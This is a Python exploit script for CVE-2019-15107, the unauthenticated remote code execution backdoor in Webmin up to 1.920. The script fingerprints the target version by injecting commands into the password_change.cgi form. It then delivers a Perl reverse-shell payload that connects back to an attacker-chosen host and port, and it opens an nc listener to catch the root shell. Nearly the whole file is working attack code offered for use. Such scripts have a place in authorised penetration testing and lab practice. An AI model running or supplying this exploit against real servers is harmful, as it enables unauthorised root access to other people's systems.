#!/usr/bin/env python3
import re
import requests
import argparse
import urllib.parse
import socket
import threading
import time
import subprocess

'''
    Title      |    Webmin <=1.920 RCE (unauthenticated)
    Date       |    08/09/2020
    Author     |    Ruthvik Vegunta 
    Vendor     |    http://www.webmin.com/
    Version    |    Webmin <-=1.920
    Tested on  |    Webmin v1.890, Webmin v.1920
    Purpose    |    This script exploits a backdoor vulnerability present in Webmin and it should return a root shell to the user once they run this script
    Usage      |    python webmin_rce.py -t http://10.11.1.88:10000 -l 172.16.1.3 -p 7777
    CVE        |    CVE-2019-15107
'''

banner = """
  ___  _  _  ____     ___   ___  __  ___      __  ___  __  ___  ___
 / __)( \/ )( ___)___(__ \ / _ \/  )/ _ \ ___/  )| __)/  )/ _ \(__ )
( (__  \  /  )__)(___)/ _/( (_) ))( \_  /(___))( |__ \ )(( (_) )/ /
 \___)  \/  (____)   (____)\___/(__) (_/     (__)(___/(__)\___/(_/
+-+-+ +-+-+-+-+-+
|B|y| |v|r|v|i|k|
+-+-+ +-+-+-+-+-+
 """

#This is to check if password_change.cgi page exits or not
def check_password_change(base_url):
	url = base_url + '/password_change.cgi'
	headers = {
		'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
		'Referer': "%s/session_login.cgi"%base_url,
	}
	post_req = requests.get(url, headers=headers, verify=False)
	return post_req

#This is to determine the version of webmin
#We need this because payload for v1.890 is different from the payload from >1.890 & <= 1.920
def version(base_url):
	url = base_url + '/password_change.cgi'
	headers = {
		'Accept-Encoding': "gzip, deflate",
		'Accept': "*/*",
		'Accept-Language': "en",
		'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
		'Connection': "close",
		'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
		'Referer': "%s/session_login.cgi"%base_url,
		'Content-Type': "application/x-www-form-urlencoded",
		'Content-Length': "60",
		'cache-control': "no-cache"
	} 
	if re.search(".*uid=0*", requests.post(url, headers=headers, data="user=root&pam=&expired=2&old=vrvik%7cid%20&new1=vrvik&new2=vrvik", verify=False).content.decode('utf-8')):
		ver = '>1.890'
	if re.search(".*uid=0*", requests.post(url, headers=headers, data="expired=id", verify=False).content.decode('utf-8')):
		ver = '1.890'
	else:
		print("\nLook's like the application is patched and is not vulnerable\n")
		exit()
	return ver

#Based on the version we detect in the above function, we exploit the application with a special crafted payload
def exploit(base_url, command, ver):
	time.sleep(5)
	url = base_url + '/password_change.cgi'
	headers = {
		'Accept-Encoding': "gzip, deflate",
		'Accept': "*/*",
		'Accept-Language': "en",
		'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
		'Connection': "close",
		'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
		'Referer': "%s/session_login.cgi"%base_url,
		'Content-Type': "application/x-www-form-urlencoded",
		'Content-Length': "60",
		'cache-control': "no-cache"
	}
	if(ver == '1.890'):
		payload = "expired=%s"%urllib.parse.quote_plus(command)
	elif(ver == '>1.890'):
		payload = "user=root&pam=&expired=2&old=vrvik%7c" + urllib.parse.quote_plus(command) + "%20&new1=vrvik&new2=vrvik"
	requests.post(url, headers=headers, data=payload, verify=False)

if __name__ == "__main__":
	#Script Arguments
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', type=str, required=True, help='Target URL, example: http://10.10.10.10:10000', dest='target')
	parser.add_argument('-l', type=str, required=True, help='localhost IP to listen on', dest='lhost')
	parser.add_argument('-p', type=str, required=True, help='localhost Port to listen on', dest='lport')
	args = parser.parse_args()
	print(banner)
	if args.target is None or args.lhost is None or args.lport is None:
		parser.print_help()
		exit()
	if bool(re.search('[hH][tT][tT][pP][sS]?\:\/\/', args.target)) == False:
		print('There is something wrong with the URL, it needs to have http://\n\n')
		exit()
	#Shell payload part
	print('Webmin uses perl by default, so we will be using a perl reverse shell payload for this\n')
	shell_payload = "perl -e 'use Socket;$i=\"" + args.lhost + "\";$p=" + args.lport + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	print('Reverse shell payload updated with the given lhost and lport\n')
	#Actual Exploit starts from here
	check_result = check_password_change(args.target)
	print('Starting a thread to get a reverse connection onto the listener\n')
	if check_result.status_code == 200 and re.search(".*Failed*", check_result.content.decode('utf-8')):
		ver = version(args.target)
		if(ver == '1.890'):
			print("Webmin version 1.890 detected\n")
		elif(ver == '>1.890'):
			print("Webmin version > 1.890 detected\n")
		z = threading.Thread(target=exploit, args=(args.target, shell_payload, ver))
		z.daemon = True
		z.start()
		print(f'Starting a listener on port {args.lport}, Please wait... this might take a few seconds.\n')
		try:
			subprocess.call('nc -nlvp ' + args.lport, shell=True)
		except Exception as e:
			print(f'\nException Occured: {e}')
	else:
		print("\nLook's like the application is patched and is not vulnerable\n")
		exit()
